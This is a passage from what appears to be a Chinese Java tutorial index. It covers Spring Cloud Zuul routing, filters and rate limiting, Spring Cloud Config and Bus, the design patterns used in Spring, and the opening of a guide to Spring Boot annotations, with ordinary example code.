localhost:9000/zuul/consumer1/studentInfo/update 来进行访问了。\n路由策略配置    你会发现前面的访问方式(直接使用服务名)，需要将微服务名称暴露给用户，会存在安全性问题。所以，可以自定义路径来替代微服务名称，即自定义路由策略。\nzuul:routes:consumer1:/FrancisQ1/**consumer2:/FrancisQ2/**这个时候你就可以使用  localhost:9000/zuul/FrancisQ1/studentInfo/update` 进行访问了。\n服务名屏蔽    这个时候你别以为你好了，你可以试试，在你配置完路由策略之后使用微服务名称还是可以访问的，这个时候你需要将服务名屏蔽。\nzuul:ignore-services:\u0026#34;*\u0026#34;路径屏蔽    Zuul 还可以指定屏蔽掉的路径 URI，即只要用户请求中包含指定的 URI 路径，那么该请求将无法访问到指定的服务。通过该方式可以限制用户的权限。\nzuul:ignore-patterns:**/auto/**这样关于 auto 的请求我们就可以过滤掉了。\n ** 代表匹配多级任意路径\n*代表匹配一级任意路径\n 敏感请求头屏蔽    默认情况下，像 Cookie、Set-Cookie 等敏感请求头信息会被 zuul 屏蔽掉，我们可以将这些默认屏蔽去掉，当然，也可以添加要屏蔽的请求头。\nZuul 的过滤功能    如果说，路由功能是 Zuul 的基操的话，那么过滤器就是 Zuul的利器了。毕竟所有请求都经过网关(Zuul)，那么我们可以进行各种过滤，这样我们就能实现 限流，灰度发布，权限控制 等等。\n简单实现一个请求时间日志打印    要实现自己定义的 Filter 我们只需要继承 ZuulFilter 然后将这个过滤器类以 @Component 注解加入 Spring 容器中就行了。\n在给你们看代码之前我先给你们解释一下关于过滤器的一些注意点。\n过滤器类型：Pre、Routing、Post。前置Pre就是在请求之前进行过滤，Routing路由过滤器就是我们上面所讲的路由策略，而Post后置过滤器就是在 Response 之前进行过滤的过滤器。你可以观察上图结合着理解，并且下面我会给出相应的注释。\n// 加入Spring容器 @Component public class PreRequestFilter extends ZuulFilter { // 返回过滤器类型 这里是前置过滤器  @Override public String filterType() { return FilterConstants.PRE_TYPE; } // 指定过滤顺序 越小越先执行，这里第一个执行  // 当然不是只真正第一个 在Zuul内置中有其他过滤器会先执行  // 那是写死的 比如 SERVLET_DETECTION_FILTER_ORDER = -3  @Override public int filterOrder() { return 0; } // 什么时候该进行过滤  // 这里我们可以进行一些判断，这样我们就可以过滤掉一些不符合规定的请求等等  @Override public boolean shouldFilter() { return true; } // 如果过滤器允许通过则怎么进行处理  @Override public Object run() throws ZuulException { // 这里我设置了全局的RequestContext并记录了请求开始时间  RequestContext ctx = RequestContext.getCurrentContext(); ctx.set(\u0026#34;startTime\u0026#34;, System.currentTimeMillis()); return null; } } // lombok的日志 @Slf4j // 加入 Spring 容器 @Component public class AccessLogFilter extends ZuulFilter { // 指定该过滤器的过滤类型  // 此时是后置过滤器  @Override public String filterType() { return FilterConstants.POST_TYPE; } // SEND_RESPONSE_FILTER_ORDER 是最后一个过滤器  // 我们此过滤器在它之前执行  @Override public int filterOrder() { return FilterConstants.SEND_RESPONSE_FILTER_ORDER - 1; } @Override public boolean shouldFilter() { return true; } // 过滤时执行的策略  @Override public Object run() throws ZuulException { RequestContext context = RequestContext.getCurrentContext(); HttpServletRequest request = context.getRequest(); // 从RequestContext获取原先的开始时间 并通过它计算整个时间间隔  Long startTime = (Long) context.get(\u0026#34;startTime\u0026#34;); // 这里我可以获取HttpServletRequest来获取URI并且打印出来  String uri = request.getRequestURI(); long duration = System.currentTimeMillis() - startTime; log.info(\u0026#34;uri: \u0026#34; + uri + \u0026#34;, duration: \u0026#34; + duration / 100 + \u0026#34;ms\u0026#34;); return null; } } 上面就简单实现了请求时间日志打印功能，你有没有感受到 Zuul 过滤功能的强大了呢？\n没有？好的、那我们再来。\n令牌桶限流    当然不仅仅是令牌桶限流方式，Zuul 只要是限流的活它都能干，这里我只是简单举个:chestnut:。\n我先来解释一下什么是 令牌桶限流 吧。\n首先我们会有个桶，如果里面没有满那么就会以一定 固定的速率 会往里面放令牌，一个请求过来首先要从桶中获取令牌，如果没有获取到，那么这个请求就拒绝，如果获取到那么就放行。很简单吧，啊哈哈、\n下面我们就通过 Zuul 的前置过滤器来实现一下令牌桶限流。\npackage com.lgq.zuul.filter; import com.google.common.util.concurrent.RateLimiter; import com.netflix.zuul.ZuulFilter; import com.netflix.zuul.context.RequestContext; import com.netflix.zuul.exception.ZuulException; import lombok.extern.slf4j.Slf4j; import org.springframework.cloud.netflix.zuul.filters.support.FilterConstants; import org.springframework.stereotype.Component; @Component @Slf4j public class RouteFilter extends ZuulFilter { // 定义一个令牌桶，每秒产生2个令牌，即每秒最多处理2个请求  private static final RateLimiter RATE_LIMITER = RateLimiter.create(2); @Override public String filterType() { return FilterConstants.PRE_TYPE; } @Override public int filterOrder() { return -5; } @Override public Object run() throws ZuulException { log.info(\u0026#34;放行\u0026#34;); return null; } @Override public boolean shouldFilter() { RequestContext context = RequestContext.getCurrentContext(); if(!RATE_LIMITER.tryAcquire()) { log.warn(\u0026#34;访问量超载\u0026#34;); // 指定当前请求未通过过滤  context.setSendZuulResponse(false); // 向客户端返回响应码429，请求数量过多  context.setResponseStatusCode(429); return false; } return true; } } 这样我们就能将请求数量控制在一秒两个，有没有觉得很酷？\n关于 Zuul 的其他    Zuul 的过滤器的功能肯定不止上面我所实现的两种，它还可以实现 权限校验，包括我上面提到的 灰度发布 等等。\n当然，Zuul 作为网关肯定也存在 单点问题 ，如果我们要保证 Zuul 的高可用，我们就需要进行 Zuul 的集群配置，这个时候可以借助额外的一些负载均衡器比如 Nginx 。\n##Spring Cloud配置管理——Config\n为什么要使用进行配置管理？    当我们的微服务系统开始慢慢地庞大起来，那么多 Consumer 、Provider 、Eureka Server 、Zuul 系统都会持有自己的配置，这个时候我们在项目运行的时候可能需要更改某些应用的配置，如果我们不进行配置的统一管理，我们只能去每个应用下一个一个寻找配置文件然后修改配置文件再重启应用。\n首先对于分布式系统而言我们就不应该去每个应用下去分别修改配置文件，再者对于重启应用来说，服务无法访问所以直接抛弃了可用性，这是我们更不愿见到的。\n那么有没有一种方法既能对配置文件统一地进行管理，又能在项目运行时动态修改配置文件呢？\n那就是我今天所要介绍的 Spring Cloud Config 。\n 能进行配置管理的框架不止 Spring Cloud Config 一种，大家可以根据需求自己选择（disconf，阿波罗等等）。而且对于 Config 来说有些地方实现的不是那么尽人意。\n Config 是什么     Spring Cloud Config 为分布式系统中的外部化配置提供服务器和客户端支持。使用 Config 服务器，可以在中心位置管理所有环境中应用程序的外部属性。\n 简单来说，Spring Cloud Config 就是能将各个 应用/系统/模块 的配置文件存放到 统一的地方然后进行管理(Git 或者 SVN)。\n你想一下，我们的应用是不是只有启动的时候才会进行配置文件的加载，那么我们的 Spring Cloud Config 就暴露出一个接口给启动应用来获取它所想要的配置文件，应用获取到配置文件然后再进行它的初始化工作。就如下图。\n当然这里你肯定还会有一个疑问，如果我在应用运行时去更改远程配置仓库(Git)中的对应配置文件，那么依赖于这个配置文件的已启动的应用会不会进行其相应配置的更改呢？\n答案是不会的。\n什么？那怎么进行动态修改配置文件呢？这不是出现了 配置漂移 吗？你个渣男:rage:，你又骗我！\n别急嘛，你可以使用 Webhooks ，这是 github 提供的功能，它能确保远程库的配置文件更新后客户端中的配置信息也得到更新。\n噢噢，这还差不多。我去查查怎么用。\n慢着，听我说完，Webhooks 虽然能解决，但是你了解一下会发现它根本不适合用于生产环境，所以基本不会使用它的。\n而一般我们会使用 Bus 消息总线 + Spring Cloud Config 进行配置的动态刷新。\n引出 Spring Cloud Bus     用于将服务和服务实例与分布式消息系统链接在一起的事件总线。在集群中传播状态更改很有用（例如配置更改事件）。\n 你可以简单理解为 Spring Cloud Bus 的作用就是管理和广播分布式系统中的消息，也就是消息引擎系统中的广播模式。当然作为 消息总线 的 Spring Cloud Bus 可以做很多事而不仅仅是客户端的配置刷新功能。\n而拥有了 Spring Cloud Bus 之后，我们只需要创建一个简单的请求，并且加上 @ResfreshScope 注解就能进行配置的动态修改了，下面我画了张图供你理解。\n总结    这篇文章中我带大家初步了解了 Spring Cloud 的各个组件，他们有\n Eureka 服务发现框架 Ribbon 进程内负载均衡器 Open Feign 服务调用映射 Hystrix 服务降级熔断器 Zuul 微服务网关 Config 微服务统一配置中心 Bus 消息总线  如果你能这个时候能看懂文首那张图，也就说明了你已经对 Spring Cloud 微服务有了一定的架构认识。\n"},{"id":303,"href":"/system-design/framework/spring/Spring-Design-Patterns/","title":"Spring-Design-Patterns","parent":"spring","content":"点击关注公众号及时获取笔主最新更新文章，并可免费领取本文档配套的《Java面试突击》以及Java工程师必备学习资源。\n 控制反转(IoC)和依赖注入(DI) 工厂设计模式 单例设计模式 代理设计模式  代理模式在 AOP 中的应用 Spring AOP 和 AspectJ AOP 有什么区别?   模板方法 观察者模式  Spring 事件驱动模型中的三种角色  事件角色 事件监听者角色 事件发布者角色   Spring 的事件流程总结   适配器模式  spring AOP中的适配器模式 spring MVC中的适配器模式   装饰者模式 总结 参考  JDK 中用到了那些设计模式?Spring 中用到了那些设计模式?这两个问题，在面试中比较常见。我在网上搜索了一下关于 Spring 中设计模式的讲解几乎都是千篇一律，而且大部分都年代久远。所以，花了几天时间自己总结了一下，由于我的个人能力有限，文中如有任何错误各位都可以指出。另外，文章篇幅有限，对于设计模式以及一些源码的解读我只是一笔带过，这篇文章的主要目的是回顾一下 Spring 中的设计模式。\nDesign Patterns(设计模式) 表示面向对象软件开发中最好的计算机编程实践。 Spring 框架中广泛使用了不同类型的设计模式，下面我们来看看到底有哪些设计模式?\n控制反转(IoC)和依赖注入(DI)    IoC(Inversion of Control,控制反转) 是Spring 中一个非常非常重要的概念，它不是什么技术，而是一种解耦的设计思想。它的主要目的是借助于“第三方”(Spring 中的 IOC 容器) 实现具有依赖关系的对象之间的解耦(IOC容器管理对象，你只管使用即可)，从而降低代码之间的耦合度。IOC 是一个原则，而不是一个模式，以下模式（但不限于）实现了IoC原则。\nSpring IOC 容器就像是一个工厂一样，当我们需要创建一个对象的时候，只需要配置好配置文件/注解即可，完全不用考虑对象是如何被创建出来的。 IOC 容器负责创建对象，将对象连接在一起，配置这些对象，并从创建中处理这些对象的整个生命周期，直到它们被完全销毁。\n在实际项目中一个 Service 类如果有几百甚至上千个类作为它的底层，我们需要实例化这个 Service，你可能要每次都要搞清这个 Service 所有底层类的构造函数，这可能会把人逼疯。如果利用 IOC 的话，你只需要配置好，然后在需要的地方引用就行了，这大大增加了项目的可维护性且降低了开发难度。关于Spring IOC 的理解，推荐看这一下知乎的一个回答：https://www.zhihu.com/question/23277575/answer/169698662 ，非常不错。\n控制反转怎么理解呢? 举个例子：\u0026ldquo;对象a 依赖了对象 b，当对象 a 需要使用 对象 b的时候必须自己去创建。但是当系统引入了 IOC 容器后， 对象a 和对象 b 之前就失去了直接的联系。这个时候，当对象 a 需要使用 对象 b的时候， 我们可以指定 IOC 容器去创建一个对象b注入到对象 a 中\u0026rdquo;。 对象 a 获得依赖对象 b 的过程,由主动行为变为了被动行为，控制权反转，这就是控制反转名字的由来。\nDI(Dependecy Inject,依赖注入)是实现控制反转的一种设计模式，依赖注入就是将实例变量传入到一个对象中去。\n工厂设计模式    Spring使用工厂模式可以通过 BeanFactory 或 ApplicationContext 创建 bean 对象。\n两者对比：\n BeanFactory ：延迟注入(使用到某个 bean 的时候才会注入),相比于ApplicationContext 来说会占用更少的内存，程序启动速度更快。 ApplicationContext ：容器启动的时候，不管你用没用到，一次性创建所有 bean 。BeanFactory 仅提供了最基本的依赖注入支持， ApplicationContext 扩展了 BeanFactory ,除了有BeanFactory的功能还有额外更多功能，所以一般开发人员使用 ApplicationContext会更多。  ApplicationContext的三个实现类：\n ClassPathXmlApplication：把上下文文件当成类路径资源。 FileSystemXmlApplication：从文件系统中的 XML 文件载入上下文定义信息。 XmlWebApplicationContext：从Web系统中的XML文件载入上下文定义信息。  Example:\nimport org.springframework.context.ApplicationContext; import org.springframework.context.support.FileSystemXmlApplicationContext; public class App { public static void main(String[] args) { ApplicationContext context = new FileSystemXmlApplicationContext( \u0026#34;C:/work/IOC Containers/springframework.applicationcontext/src/main/resources/bean-factory-config.xml\u0026#34;); HelloApplicationContext obj = (HelloApplicationContext) context.getBean(\u0026#34;helloApplicationContext\u0026#34;); obj.getMsg(); } } 单例设计模式    在我们的系统中，有一些对象其实我们只需要一个，比如说：线程池、缓存、对话框、注册表、日志对象、充当打印机、显卡等设备驱动程序的对象。事实上，这一类对象只能有一个实例，如果制造出多个实例就可能会导致一些问题的产生，比如：程序的行为异常、资源使用过量、或者不一致性的结果。\n使用单例模式的好处:\n 对于频繁使用的对象，可以省略创建对象所花费的时间，这对于那些重量级对象而言，是非常可观的一笔系统开销； 由于 new 操作的次数减少，因而对系统内存的使用频率也会降低，这将减轻 GC 压力，缩短 GC 停顿时间。  Spring 中 bean 的默认作用域就是 singleton(单例)的。 除了 singleton 作用域，Spring 中 bean 还有下面几种作用域：\n prototype : 每次请求都会创建一个新的 bean 实例。 request : 每一次HTTP请求都会产生一个新的bean，该bean仅在当前HTTP request内有效。 session : 每一次HTTP请求都会产生一个新的 bean，该bean仅在当前 HTTP session 内有效。 global-session： 全局session作用域，仅仅在基于portlet的web应用中才有意义，Spring5已经没有了。Portlet是能够生成语义代码(例如：HTML)片段的小型Java Web插件。它们基于portlet容器，可以像servlet一样处理HTTP请求。但是，与 servlet 不同，每个 portlet 都有不同的会话  Spring 实现单例的方式：\n xml : \u0026lt;bean id=\u0026quot;userService\u0026quot; class=\u0026quot;top.snailclimb.UserService\u0026quot; scope=\u0026quot;singleton\u0026quot;/\u0026gt; 注解：@Scope(value = \u0026quot;singleton\u0026quot;)  Spring 通过 ConcurrentHashMap 实现单例注册表的特殊方式实现单例模式。Spring 实现单例的核心代码如下\n// 通过 ConcurrentHashMap（线程安全） 实现单例注册表 private final Map\u0026lt;String, Object\u0026gt; singletonObjects = new ConcurrentHashMap\u0026lt;String, Object\u0026gt;(64); public Object getSingleton(String beanName, ObjectFactory\u0026lt;?\u0026gt; singletonFactory) { Assert.notNull(beanName, \u0026#34;\u0026#39;beanName\u0026#39; must not be null\u0026#34;); synchronized (this.singletonObjects) { // 检查缓存中是否存在实例  Object singletonObject = this.singletonObjects.get(beanName); if (singletonObject == null) { //...省略了很多代码  try { singletonObject = singletonFactory.getObject(); } //...省略了很多代码  // 如果实例对象在不存在，我们注册到单例注册表中。  addSingleton(beanName, singletonObject); } return (singletonObject != NULL_OBJECT ? singletonObject : null); } } //将对象添加到单例注册表  protected void addSingleton(String beanName, Object singletonObject) { synchronized (this.singletonObjects) { this.singletonObjects.put(beanName, (singletonObject != null ? singletonObject : NULL_OBJECT)); } } } 代理设计模式    代理模式在 AOP 中的应用    AOP(Aspect-Oriented Programming:面向切面编程)能够将那些与业务无关，却为业务模块所共同调用的逻辑或责任（例如事务处理、日志管理、权限控制等）封装起来，便于减少系统的重复代码，降低模块间的耦合度，并有利于未来的可拓展性和可维护性。\nSpring AOP 就是基于动态代理的，如果要代理的对象，实现了某个接口，那么Spring AOP会使用JDK Proxy，去创建代理对象，而对于没有实现接口的对象，就无法使用 JDK Proxy 去进行代理了，这时候Spring AOP会使用Cglib ，这时候Spring AOP会使用 Cglib 生成一个被代理对象的子类来作为代理，如下图所示：\n当然你也可以使用 AspectJ ,Spring AOP 已经集成了AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。\n使用 AOP 之后我们可以把一些通用功能抽象出来，在需要用到的地方直接使用即可，这样大大简化了代码量。我们需要增加新功能时也方便，这样也提高了系统扩展性。日志功能、事务管理等等场景都用到了 AOP 。\nSpring AOP 和 AspectJ AOP 有什么区别?    Spring AOP 属于运行时增强，而 AspectJ 是编译时增强。 Spring AOP 基于代理(Proxying)，而 AspectJ 基于字节码操作(Bytecode Manipulation)。\nSpring AOP 已经集成了 AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。AspectJ 相比于 Spring AOP 功能更加强大，但是 Spring AOP 相对来说更简单，\n如果我们的切面比较少，那么两者性能差异不大。但是，当切面太多的话，最好选择 AspectJ ，它比Spring AOP 快很多。\n模板方法    模板方法模式是一种行为设计模式，它定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。 模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤的实现方式。\npublic abstract class Template { //这是我们的模板方法  public final void TemplateMethod(){ PrimitiveOperation1(); PrimitiveOperation2(); PrimitiveOperation3(); } protected void PrimitiveOperation1(){ //当前类实现  } //被子类实现的方法  protected abstract void PrimitiveOperation2(); protected abstract void PrimitiveOperation3(); } public class TemplateImpl extends Template { @Override public void PrimitiveOperation2() { //当前类实现  } @Override public void PrimitiveOperation3() { //当前类实现  } } Spring 中 jdbcTemplate、hibernateTemplate 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。一般情况下，我们都是使用继承的方式来实现模板模式，但是 Spring 并没有使用这种方式，而是使用Callback 模式与模板方法模式配合，既达到了代码复用的效果，同时增加了灵活性。\n观察者模式    观察者模式是一种对象行为型模式。它表示的是一种对象与对象之间具有依赖关系，当一个对象发生改变的时候，这个对象所依赖的对象也会做出反应。Spring 事件驱动模型就是观察者模式很经典的一个应用。Spring 事件驱动模型非常有用，在很多场景都可以解耦我们的代码。比如我们每次添加商品的时候都需要重新更新商品索引，这个时候就可以利用观察者模式来解决这个问题。\nSpring 事件驱动模型中的三种角色    事件角色    ApplicationEvent (org.springframework.context包下)充当事件的角色,这是一个抽象类，它继承了java.util.EventObject并实现了 java.io.Serializable接口。\nSpring 中默认存在以下事件，他们都是对 ApplicationContextEvent 的实现(继承自ApplicationContextEvent)：\n ContextStartedEvent：ApplicationContext 启动后触发的事件; ContextStoppedEvent：ApplicationContext 停止后触发的事件; ContextRefreshedEvent：ApplicationContext 初始化或刷新完成后触发的事件; ContextClosedEvent：ApplicationContext 关闭后触发的事件。  事件监听者角色    ApplicationListener 充当了事件监听者角色，它是一个接口，里面只定义了一个 onApplicationEvent（）方法来处理ApplicationEvent。ApplicationListener接口类源码如下，可以看出接口定义看出接口中的事件只要实现了 ApplicationEvent就可以了。所以，在 Spring中我们只要实现 ApplicationListener 接口的 onApplicationEvent() 方法即可完成监听事件\npackage org.springframework.context; import java.util.EventListener; @FunctionalInterface public interface ApplicationListener\u0026lt;E extends ApplicationEvent\u0026gt; extends EventListener { void onApplicationEvent(E var1); } 事件发布者角色    ApplicationEventPublisher 充当了事件的发布者，它也是一个接口。\n@FunctionalInterface public interface ApplicationEventPublisher { default void publishEvent(ApplicationEvent event) { this.publishEvent((Object)event); } void publishEvent(Object var1); } ApplicationEventPublisher 接口的publishEvent（）这个方法在AbstractApplicationContext类中被实现，阅读这个方法的实现，你会发现实际上事件真正是通过ApplicationEventMulticaster来广播出去的。具体内容过多，就不在这里分析了，后面可能会单独写一篇文章提到。\nSpring 的事件流程总结     定义一个事件: 实现一个继承自 ApplicationEvent，并且写相应的构造函数； 定义一个事件监听者：实现 ApplicationListener 接口，重写 onApplicationEvent() 方法； 使用事件发布者发布消息: 可以通过 ApplicationEventPublisher  的 publishEvent() 方法发布消息。  Example:\n// 定义一个事件,继承自ApplicationEvent并且写相应的构造函数 public class DemoEvent extends ApplicationEvent{ private static final long serialVersionUID = 1L; private String message; public DemoEvent(Object source,String message){ super(source); this.message = message; } public String getMessage() { return message; } // 定义一个事件监听者,实现ApplicationListener接口，重写 onApplicationEvent() 方法； @Component public class DemoListener implements ApplicationListener\u0026lt;DemoEvent\u0026gt;{ //使用onApplicationEvent接收消息  @Override public void onApplicationEvent(DemoEvent event) { String msg = event.getMessage(); System.out.println(\u0026#34;接收到的信息是：\u0026#34;+msg); } } // 发布事件，可以通过ApplicationEventPublisher 的 publishEvent() 方法发布消息。 @Component public class DemoPublisher { @Autowired ApplicationContext applicationContext; public void publish(String message){ //发布事件  applicationContext.publishEvent(new DemoEvent(this, message)); } } 当调用 DemoPublisher  的 publish() 方法的时候，比如 demoPublisher.publish(\u0026quot;你好\u0026quot;) ，控制台就会打印出:接收到的信息是：你好 。\n适配器模式    适配器模式(Adapter Pattern) 将一个接口转换成客户希望的另一个接口，适配器模式使接口不兼容的那些类可以一起工作，其别名为包装器(Wrapper)。\nspring AOP中的适配器模式    我们知道 Spring AOP 的实现是基于代理模式，但是 Spring AOP 的增强或通知(Advice)使用到了适配器模式，与之相关的接口是AdvisorAdapter  。Advice 常用的类型有：BeforeAdvice（目标方法调用前,前置通知）、AfterAdvice（目标方法调用后,后置通知）、AfterReturningAdvice(目标方法执行结束后，return之前)等等。每个类型Advice（通知）都有对应的拦截器:MethodBeforeAdviceInterceptor、AfterReturningAdviceAdapter、AfterReturningAdviceInterceptor。Spring预定义的通知要通过对应的适配器，适配成 MethodInterceptor接口(方法拦截器)类型的对象（如：MethodBeforeAdviceInterceptor 负责适配 MethodBeforeAdvice）。\nspring MVC中的适配器模式    在Spring MVC中，DispatcherServlet 根据请求信息调用 HandlerMapping，解析请求对应的 Handler。解析到对应的 Handler（也就是我们平常说的 Controller 控制器）后，开始由HandlerAdapter 适配器处理。HandlerAdapter 作为期望接口，具体的适配器实现类用于对目标类进行适配，Controller 作为需要适配的类。\n为什么要在 Spring MVC 中使用适配器模式？ Spring MVC 中的 Controller 种类众多，不同类型的 Controller 通过不同的方法来对请求进行处理。如果不利用适配器模式的话，DispatcherServlet 直接获取对应类型的 Controller，需要的自行来判断，像下面这段代码一样：\nif(mappedHandler.getHandler() instanceof MultiActionController){ ((MultiActionController)mappedHandler.getHandler()).xxx }else if(mappedHandler.getHandler() instanceof XXX){ ... }else if(...){ ... } 假如我们再增加一个 Controller类型就要在上面代码中再加入一行 判断语句，这种形式就使得程序难以维护，也违反了设计模式中的开闭原则 – 对扩展开放，对修改关闭。\n装饰者模式    装饰者模式可以动态地给对象添加一些额外的属性或行为。相比于使用继承，装饰者模式更加灵活。简单点儿说就是当我们需要修改原有的功能，但我们又不愿直接去修改原有的代码时，设计一个Decorator套在原有代码外面。其实在 JDK 中就有很多地方用到了装饰者模式，比如 InputStream家族，InputStream 类下有 FileInputStream (读取文件)、BufferedInputStream (增加缓存,使读取文件速度大大提升)等子类都在不修改InputStream 代码的情况下扩展了它的功能。\nSpring 中配置 DataSource 的时候，DataSource 可能是不同的数据库和数据源。我们能否根据客户的需求在少修改原有类的代码下动态切换不同的数据源？这个时候就要用到装饰者模式(这一点我自己还没太理解具体原理)。Spring 中用到的包装器模式在类名上含有 Wrapper或者 Decorator。这些类基本上都是动态地给一个对象添加一些额外的职责\n总结    Spring 框架中用到了哪些设计模式？\n 工厂设计模式 : Spring使用工厂模式通过 BeanFactory、ApplicationContext 创建 bean 对象。 代理设计模式 : Spring AOP 功能的实现。 单例设计模式 : Spring 中的 Bean 默认都是单例的。 模板方法模式 : Spring 中 jdbcTemplate、hibernateTemplate 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。 包装器设计模式 : 我们的项目需要连接多个数据库，而且不同的客户在每次访问中根据需要会去访问不同的数据库。这种模式让我们可以根据客户的需求能够动态切换不同的数据源。 观察者模式: Spring 事件驱动模型就是观察者模式很经典的一个应用。 适配器模式 :Spring AOP 的增强或通知(Advice)使用到了适配器模式、spring MVC 中也是用到了适配器模式适配Controller。 \u0026hellip;\u0026hellip;  参考     《Spring技术内幕》 https://blog.eduonix.com/java-programming-2/learn-design-patterns-used-spring-framework/ http://blog.yeamin.top/2018/03/27/单例模式-Spring单例实现原理分析/ https://www.tutorialsteacher.com/ioc/inversion-of-control https://design-patterns.readthedocs.io/zh_CN/latest/behavioral_patterns/observer.html https://juejin.im/post/5a8eb261f265da4e9e307230 https://juejin.im/post/5ba28986f265da0abc2b6084  公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java面试突击》: 由本文档衍生的专为面试而生的《Java面试突击》V2.0 PDF 版本公众号后台回复 \u0026ldquo;Java面试突击\u0026rdquo; 即可免费领取！\nJava工程师必备学习资源: 一些Java工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":304,"href":"/system-design/framework/spring/SpringBoot+Spring%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3%E6%80%BB%E7%BB%93/","title":"SpringBoot+Spring常用注解总结","parent":"spring","content":"文章目录     文章目录 0.前言 1. @SpringBootApplication 2. Spring Bean 相关  2.1. @Autowired 2.2. @Component,@Repository,@Service, @Controller 2.3. @RestController 2.4. @Scope 2.5. @Configuration   3. 处理常见的 HTTP 请求类型  3.1. GET 请求 3.2. POST 请求 3.3. PUT 请求 3.4. DELETE 请求 3.5. PATCH 请求   4. 前后端传值  4.1. @PathVariable 和 @RequestParam 4.2. @RequestBody   5. 读取配置信息  5.1. @value(常用) 5.2. @ConfigurationProperties(常用) 5.3. PropertySource（不常用）   6. 参数校验  6.1. 一些常用的字段验证的注解 6.2. 验证请求体(RequestBody) 6.3. 验证请求参数(Path Variables 和 Request Parameters)   7. 全局处理 Controller 层异常 8. JPA 相关  8.1. 创建表 8.2. 创建主键 8.3. 设置字段类型 8.4. 指定不持久化特定字段 8.5. 声明大字段 8.6. 创建枚举类型的字段 8.7. 增加审计功能 8.8. 删除/修改数据 8.9. 关联关系   9. 事务 @Transactional 10. json 数据处理  10.1. 过滤 json 数据 10.2. 格式化 json 数据 10.3. 扁平化对象   11. 测试相关  0.前言    大家好，我是 Guide 哥！这是我的 221 篇优质原创文章。如需转载，请在文首注明地址，蟹蟹！\n本文已经收录进我的 75K Star 的 Java 开源项目 JavaGuide：https://github.com/Snailclimb/JavaGuide。\n可以毫不夸张地说，这篇文章介绍的 Spring/SpringBoot 常用注解基本已经涵盖你工作中遇到的大部分常用的场景。对于每一个注解我都说了具体用法，掌握搞懂，使用 SpringBoot 来开发项目基本没啥大问题了！\n为什么要写这篇文章？\n最近看到网上有一篇关于 SpringBoot 常用注解的文章被转载的比较多，我看了文章内容之后属实觉得质量有点低，并且有点会误导没有太多实际使用经验的人（这些人又占据了大多数）。所以，自己索性花了大概 两天时间简单总结一下了。\n因为我个人的能力和精力有限，如果有任何不对或者需要完善的地方，请帮忙指出！Guide 哥感激不尽！\n1. @SpringBootApplication    这里先单独拎出@SpringBootApplication 注解说一下，虽然我们一般不会主动去使用它。\nGuide 哥：这个注解是 Spring Boot 项目的基石，创建 SpringBoot 项目之后会默认在主类加上。\n@SpringBootApplication public class SpringSecurityJwtGuideApplication { public static void main(java.lang.String[] args) { SpringApplication.run(SpringSecurityJwtGuideApplication.class, args); } } 我们可以把 @SpringBootApplication看作是 @Configuration、@EnableAutoConfiguration、@ComponentScan 注解的集合。\npackage org.springframework.boot.autoconfigure; @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(excludeFilters = { @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) }) public @interface SpringBootApplication { ...... } package org.springframework.boot; @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Configuration public @interface SpringBootConfiguration { } 根据 SpringBoot 官网，这三个注解的作用分别是：\n @EnableAutoConfiguration：启用 SpringBoot 的自动配置机制 @ComponentScan： 扫描被@Component (@Service,@Controller)注解的 bean，注解默认会扫描该类所在的包下所有的类。 @Configuration：允许在 Spring 上下文中注册额外的 bean 或导入其他配置类  2. Spring Bean 相关    2.1. @Autowired    自动导入对象到类中，被注入进的类同样要被 Spring 容器管理比如：Service 类注入到 Controller 类中。\n@Service public class UserService { ...... } @RestController @RequestMapping(\u0026#34;/users\u0026#34;) public class UserController { @Autowired private UserService userService; ...... } 2.2. @Component,@Repository,@Service, @Controller    我们一般使用 @Autowired 注解让 Spring 容器帮我们自动装配 bean。要想把类标识成可用于 @Autowired 注解自动装配的 bean 的类,可以采用以下注解实现：\n @Component ：通用的注解，可标注任意类为 Spring 组件。如果一个 Bean 不知道属于哪个层，可以使用@Component 注解标注。 @Repository : 对应持久层即 Dao 层，主要用于数据库相关操作。 @Service : 对应服务层，主要涉及一些复杂的逻辑，需要用到 Dao 层。 @Controller : 对应 Spring MVC 控制层，主要用于接受用户请求并调用 Service 层返回数据给前端页面。  2.3. @RestController    @RestController注解是@Controller和@ResponseBody的合集,表示这是个控制器 bean,并且是将函数的返回值直接填入 HTTP 响应体中,是 REST 风格的控制器。\nGuide 哥：现在都是前后端分离，说实话我已经很久没有用过@Controller。如果你的项目太老了的话，就当我没说。\n单独使用 @Controller 不加 @ResponseBody的话一般是用在要返回一个视图的情况，这种情况属于比较传统的 Spring MVC 的应用，对应于前后端不分离的情况。@Controller +@ResponseBody 返回 JSON 或 XML 形式数据\n关于@RestController 和 @Controller的对比，请看这篇文章：@RestController vs @Controller。\n2.4. @Scope    声明 Spring Bean 的作用域，使用方法:\n@Bean @Scope(\u0026#34;singleton\u0026#34;) public Person personSingleton() { return new Person(); } 四种常见的 Spring Bean 的作用域：\n singleton : 唯一 bean 实例，Spring 中的 bean 默认都是单例的。 prototype : 每次请求都会创建一个新的 bean 实例。 request : 每一次 HTTP 请求都会产生一个新的 bean，该 bean 仅在当前 HTTP request 内有效。 session : 每一次 HTTP 请求都会产生一个新的 bean，该 bean 仅在当前 HTTP session 内有效。  2.5. @Configuration    一般用来声明配置类，可以使用 @Component注解替代，不过使用@Configuration注解声明配置类更加语义化。\n@Configuration public class AppConfig { @Bean public TransferService transferService() { return new TransferServiceImpl(); } } 3. 处理常见的 HTTP 请求类型    5 种常见的请求类型:\n GET ：请求从服务器获取特定资源。举个例子：GET /users（获取所有学生） POST ：在服务器上创建一个新的资源。举个例子：POST /users（创建学生） PUT ：更新服务器上的资源（客户端提供更新后的整个资源）。举个例子：PUT /users/12（更新编号为 12 的学生） DELETE 